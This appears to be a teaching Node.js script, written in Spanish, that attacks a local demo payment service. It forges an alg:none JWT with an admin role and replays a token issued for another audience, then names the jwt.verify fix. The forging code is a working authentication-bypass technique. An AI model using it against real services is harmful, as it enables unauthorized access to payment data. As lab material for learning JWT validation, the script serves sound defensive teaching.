// attack.js  ->  npm run attack
// Script de ataque DIDÁCTICO contra svc-pagos (solo 127.0.0.1).
//
// IMPORTANTE: este archivo NO importa config.js. El atacante NO conoce JWT_SECRET.
// Todo lo que hace lo consigue manipulando el token que él mismo recibió.
//
// Ataques:
//   1) Login normal como ana (rol user)      -> comportamiento legítimo
//   2) Token FORJADO alg:none con rol admin  -> falla de verificación de firma/algoritmo
//   3) Token legítimo de OTRA audiencia      -> falta de validación de "aud"

const ui = require('./ui');

// Direcciones fijas en localhost: la demo no está pensada para atacar nada más.
const AUTH = 'http://127.0.0.1:4000';
const PAGOS = 'http://127.0.0.1:4001';

// ---------- utilidades ----------
const b64url = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
const leerPayload = (jwt) => JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());

async function http(url, { token, body } = {}) {
  const resp = await fetch(url, {
    method: body ? 'POST' : 'GET',
    headers: {
      ...(body ? { 'Content-Type': 'application/json' } : {}),
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  return { status: resp.status, datos: await resp.json() };
}

function mostrarTarjetas(tarjetas) {
  for (const t of tarjetas) {
    console.log(`       - ${t.titular.padEnd(22)} ${t.numero.padEnd(20)} vence ${t.vence}  saldo $${t.saldo.toLocaleString('es-CO')}`);
  }
}

// Intenta /api/cards con un token y reporta si el servidor lo ACEPTÓ o lo BLOQUEÓ.
async function intentarTarjetas(token) {
  const r = await http(`${PAGOS}/api/cards`, { token });
  if (r.status === 200) {
    console.log(`  ${ui.VULNERABLE} GET /api/cards -> 200  ${ui.rojo(ui.negrita('¡el token forjado fue ACEPTADO!'))}`);
    console.log(ui.rojo('     Datos sensibles expuestos (ficticios):'));
    mostrarTarjetas(r.datos.tarjetas);
    return true;
  }
  console.log(`  ${ui.BLOQUEADO} GET /api/cards -> ${r.status}  ${ui.verde(ui.negrita('el servidor rechazó el token'))}`);
  console.log(`     Motivo: ${r.datos.motivo || r.datos.error}`);
  return false;
}

async function main() {
  ui.titulo('ATAQUE A svc-pagos  -  OWASP A07:2025 (JWT mal validado)');

  // --- ¿Está el servicio arriba? ¿En qué modo? ---
  let modo;
  try {
    modo = (await http(`${PAGOS}/health`)).datos.modo;
  } catch {
    console.error(`\n${ui.rojo('No se pudo conectar con svc-pagos en ' + PAGOS)}`);
    console.error('Primero levanta los servicios en otra terminal:  npm run vuln   (o  npm run secure)\n');
    process.exit(1);
  }
  console.log(`Objetivo: ${PAGOS}   Modo detectado: ` +
    (modo === 'vulnerable' ? `${ui.VULNERABLE} VULNERABLE` : `${ui.OK} SECURE`));

  // =====================================================================
  //  PASO 1 - Login normal como ana (rol user)
  // =====================================================================
  ui.subtitulo('[1/3] Login normal como "ana" (rol user)');
  const login = await http(`${AUTH}/login`, { body: { username: 'ana', password: 'ana123' } });
  const tokenAna = login.datos.token;
  const claimsAna = leerPayload(tokenAna);
  console.log(`  ${ui.OK} Token legítimo emitido por auth-service (firmado, HS256)`);
  console.log(ui.tenue(`     claims: ${JSON.stringify(claimsAna)}`));

  const me = await http(`${PAGOS}/api/me`, { token: tokenAna });
  console.log(`  ${ui.OK} GET /api/me    -> ${me.status}  soy "${me.datos.sub}" con rol "${me.datos.role}"`);
  const cardsAna = await http(`${PAGOS}/api/cards`, { token: tokenAna });
  console.log(`  ${ui.OK} GET /api/cards -> ${cardsAna.status}  ${cardsAna.datos.motivo}`);
  console.log(ui.tenue('     (correcto: un usuario normal NO debe ver las tarjetas)'));

  // =====================================================================
  //  PASO 2 - Token forjado: alg:none + role admin (sin conocer la clave)
  // =====================================================================
  ui.subtitulo('[2/3] Forjando token  alg:none + role:"admin"  (sin conocer la clave)');
  console.log(ui.tenue('     Un JWT NO está cifrado: es Base64 legible. Copiamos nuestros claims y cambiamos el rol.'));
  const cabeceraForjada = { alg: 'none', typ: 'JWT' };
  const payloadForjado = { ...claimsAna, role: 'admin' };
  const tokenForjado = `${b64url(cabeceraForjada)}.${b64url(payloadForjado)}.`; // firma VACÍA
  console.log(`     header : ${JSON.stringify(cabeceraForjada)}`);
  console.log(`     payload: ${JSON.stringify(payloadForjado)}`);
  console.log(`     token  : ${tokenForjado.slice(0, 40)}...  (sin firma)`);
  const ataque2 = await intentarTarjetas(tokenForjado);

  // =====================================================================
  //  PASO 3 - Confusión de audiencia: token legítimo emitido para otro servicio
  // =====================================================================
  ui.subtitulo('[3/3] Reutilizando un token legítimo emitido para OTRO servicio (aud distinta)');
  console.log(ui.tenue('     "bruno" es admin de svc-inventario. Su token está bien firmado, pero NO es para svc-pagos.'));
  const loginBruno = await http(`${AUTH}/login`, {
    body: { username: 'bruno', password: 'bruno123', audience: 'svc-inventario' },
  });
  const tokenBruno = loginBruno.datos.token;
  const claimsBruno = leerPayload(tokenBruno);
  console.log(`  ${ui.OK} Token legítimo (firma válida) con aud="${claimsBruno.aud}" role="${claimsBruno.role}"`);
  const ataque3 = await intentarTarjetas(tokenBruno);

  // =====================================================================
  //  RESUMEN
  // =====================================================================
  ui.titulo('RESUMEN');
  const exitos = [ataque2, ataque3].filter(Boolean).length;
  if (exitos > 0) {
    console.log(`${ui.VULNERABLE} ${exitos} de 2 ataques tuvieron éxito. svc-pagos confía en tokens que NO verificó.`);
    console.log(ui.rojo('  Causa: jwt.decode() en lugar de jwt.verify() (sin firma, sin algorithms, sin aud/iss/exp).'));
  } else {
    console.log(`${ui.BLOQUEADO} 0 de 2 ataques tuvieron éxito. svc-pagos validó firma, algoritmo, aud, iss y exp.`);
    console.log(ui.verde('  Corrección: jwt.verify(token, clave, { algorithms, issuer, audience }).'));
  }
  console.log();
}

main().catch((err) => {
  console.error(ui.rojo(`Error inesperado: ${err.message}`));
  process.exit(1);
});
